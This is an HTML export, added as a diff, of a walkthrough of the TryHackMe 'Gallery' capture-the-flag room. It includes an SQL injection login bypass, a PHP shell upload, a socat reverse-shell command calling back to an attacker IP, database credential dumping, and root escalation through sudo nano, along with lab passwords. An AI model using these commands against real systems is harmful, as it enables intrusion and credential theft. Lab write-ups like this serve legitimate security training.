@@ -1,0 +1,465 @@
+<html>
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=Generator content="Microsoft Word 15 (filtered)">
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:"Cambria Math";
+	panose-1:2 4 5 3 5 4 6 3 2 4;}
+@font-face
+	{font-family:Calibri;
+	panose-1:2 15 5 2 2 2 4 3 2 4;}
+@font-face
+	{font-family:Ubuntu;
+	panose-1:0 0 0 0 0 0 0 0 0 0;}
+@font-face
+	{font-family:inherit;
+	panose-1:0 0 0 0 0 0 0 0 0 0;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{margin-top:0in;
+	margin-right:0in;
+	margin-bottom:8.0pt;
+	margin-left:0in;
+	line-height:107%;
+	font-size:11.0pt;
+	font-family:"Calibri",sans-serif;}
+a:link, span.MsoHyperlink
+	{color:blue;
+	text-decoration:underline;}
+p
+	{margin-right:0in;
+	margin-left:0in;
+	font-size:12.0pt;
+	font-family:"Times New Roman",serif;}
+.MsoChpDefault
+	{font-family:"Calibri",sans-serif;}
+.MsoPapDefault
+	{margin-bottom:8.0pt;
+	line-height:107%;}
+@page WordSection1
+	{size:595.3pt 841.9pt;
+	margin:1.0in 1.0in 1.0in 1.0in;}
+div.WordSection1
+	{page:WordSection1;}
+-->
+</style>
+
+</head>
+
+<body lang=EN-AU link=blue vlink="#954F72" style='word-wrap:break-word'>
+
+<div class=WordSection1>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span style='font-size:20.0pt;font-family:"Ubuntu",serif;
+color:#979797'>Gallery</span></b></p>
+
+<p style='margin:0in'><span style='font-family:"Ubuntu",serif;color:#979797'>Try
+to exploit our image gallery system</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span><cite><span style='font-size:9.0pt;
+font-family:"Calibri",sans-serif;color:#595959'>From &lt;<a
+href="https://tryhackme.com/room/gallery666">https://tryhackme.com/room/gallery666</a>&gt;
+</span></cite></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-family:"Ubuntu",serif;color:#F1685E'>Task
+1</span><span lang=EN-US style='font-family:"Ubuntu",serif;color:#F1685E'>&nbsp;</span><span
+style='font-family:"Ubuntu",serif;color:#979797'>&nbsp;Deploy and get a Shell</span></p>
+
+<p style='margin:0in'><span style='font-family:"inherit",serif;color:white;
+background:#28A745'>&nbsp;Start Machine</span></p>
+
+<p style='margin:0in'><span style='font-family:"Ubuntu",serif;color:#212529'>Our
+gallery is not very well secured.</span></p>
+
+<p style='margin:0in'><span style='font-family:"Ubuntu",serif;color:#212529'>Designed
+and created by&nbsp;</span><span style='font-family:"Ubuntu",serif'><a
+href="https://twitter.com/mika_sec">Mikaa</a><span style='color:#212529'>&nbsp;!</span></span></p>
+
+<p style='margin:0in'><b><i><span style='font-size:13.5pt;font-family:"Ubuntu",serif;
+color:#F1685E'>Answer the questions below</span></i></b></p>
+
+<p style='margin:0in'><span style='font-family:"Ubuntu",serif;color:#212529'>How
+many ports are open?</span></p>
+
+<p style='margin:0in'><span style='font-family:"Ubuntu",serif;color:#212529'>What's
+the name of the CMS?</span></p>
+
+<p style='margin:0in'><span style='font-family:"Ubuntu",serif;color:#212529'>What's
+the hash password of the admin user?</span></p>
+
+<p style='margin:0in'><span style='font-family:"Ubuntu",serif;color:#212529'>What's
+the user flag?</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>===================================================================================</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>===================================================================================</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Enumeration</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>sudo nmap -A -T4 -Pn -oN nmap &lt;IP&gt; -v</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=602 height=272 id="Picture 20" src="Gallery_files/image001.jpg"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Verify the tools used to build the page</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>whatweb &lt;ip&gt; <img border=0 width=602 height=25
+id="Picture 21" src="Gallery_files/image002.png"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Search any possible exploit related to “Simple Image
+Gallery” system</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'><img border=0 width=602 height=76 id="Picture 22"
+src="Gallery_files/image003.png"></span><span lang=EN-US style='font-size:11.0pt;
+font-family:"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Verify the webpage on port 8080</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'><a href="http://%3cip%3e:8080">http://&lt;ip&gt;:8080</a></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Find a login page and try a simple SLQi</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>' or 1=1 -- -</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=602 height=163 id="Picture 17" src="Gallery_files/image004.jpg"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Manually browse the links and find that the Albums have
+option to upload files.</span></b></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Start netcat listener, upload the shell.php, open the
+shell.php and check the listener</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=602 height=212 id="Picture 16" src="Gallery_files/image005.jpg"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=602 height=438 id="Picture 15" src="Gallery_files/image006.jpg"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Find iniatialize.php has mysql credentials</span></b></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></b></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=602 height=170 id="Picture 24" src="Gallery_files/image007.png"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Get a full interact sheel tty</span></b></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Start listener on attack machine</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>socat <a href="file://%60tty%60,raw,echo=0">file:`tty`,raw,echo=0</a>
+tcp-listen:4444</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Start the socat on attacked machine, check the listner</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>socat exec:'bash -li',pty,stderr,setsid,sigint,sane
+tcp:10.4.33.203:4444</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Get the interative terminal</span></b></p>
+
+<p style='margin:0in'><i><span lang=EN-US style='font-size:16.0pt;font-family:
+"Calibri",sans-serif;color:#292929;background:white'>export TERM=xterm</span></i></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=350 height=40 id="Picture 23" src="Gallery_files/image008.png"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>cat initialize.php</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>'username'=&gt;'dev_oretnom','password'=&gt;'5da283a2d990e8d8512cf967df5bc0d0'</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>if(!defined('DB_USERNAME')) define('DB_USERNAME',&quot;<span
+style='color:white'>gallery_user</span>&quot;);</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>if(!defined('DB_PASSWORD')) define('DB_PASSWORD',&quot;<span
+style='color:white'>passw0rd321</span>&quot;);</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Use basic db commands to find the admin hash</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>SHOW DATABASES;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>use gallery_db;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>show tables;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>select * from users;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=602 height=169 id="Picture 25" src="Gallery_files/image009.png"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=602 height=511 id="Picture 26" src="Gallery_files/image010.png"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Copy and run Linpeas to further enumerate the attacked
+machine</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Find a folder backup folder on
+/var/backup/mike_home_backup/</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=493 height=120 id="Picture 10" src="Gallery_files/image011.jpg"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=505 height=144 id="Picture 9" src="Gallery_files/image012.jpg"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Find user credentials, however those credentials will not
+work, then, further verify latest shell commands from mike’s backup</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>www-data@gallery:/var/backups/mike_home_backup/documents$
+cat accounts.txt</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Spotify : mike@gmail.com:mycat666</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Netflix : mike@gmail.com:123456789pass</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>TryHackme: mike:darkhacker123</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=546 height=240 id="Picture 27" src="Gallery_files/image013.png"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Get the mike’s password&nbsp;</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>su mike</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=453 height=130 id="Picture 28" src="Gallery_files/image014.png"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Verify sudo privileges</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=602 height=166 id="Picture 5" src="Gallery_files/image015.jpg"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Run the command found;</span></b></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=469 height=45 id="Picture 4" src="Gallery_files/image016.jpg"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=516 height=336 id="Picture 3" src="Gallery_files/image017.jpg"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Knowing that the user can run nano as root.</span></b></p>
+
+<p style='margin:0in'><b><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>Find privilege escalation using nano</span></b></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'><a href="https://gtfobins.github.io/gtfobins/nano/#sudo">https://gtfobins.github.io/gtfobins/nano/#sudo</a></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=602 height=130 id="Picture 2" src="Gallery_files/image018.jpg"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span style='font-size:11.0pt;font-family:"Calibri",sans-serif'><img
+border=0 width=602 height=195 id="Picture 1" src="Gallery_files/image019.png"></span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p style='margin:0in'><span lang=EN-US style='font-size:11.0pt;font-family:
+"Calibri",sans-serif'>&nbsp;</span></p>
+
+<p class=MsoNormal>&nbsp;</p>
+
+</div>
+
+</body>
+
+</html>
